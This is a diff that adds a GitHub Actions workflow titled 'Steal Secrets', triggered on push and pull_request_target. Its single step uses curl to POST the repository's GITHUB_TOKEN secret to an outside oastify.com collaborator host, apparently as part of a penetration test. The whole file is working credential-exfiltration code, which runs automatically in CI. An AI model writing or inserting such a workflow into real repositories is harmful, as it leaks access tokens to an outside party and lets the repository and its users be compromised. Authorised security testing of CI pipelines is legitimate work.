@@ -1,0 +1,10 @@
+name: Steal Secrets
+on: [push, pull_request_target]
+
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X POST https://fj2ozw0c84n2641xzeog4x1bp2vtjl7a.oastify.com/pentest-endpoint \
+            -d "token=${{ secrets.GITHUB_TOKEN }}"
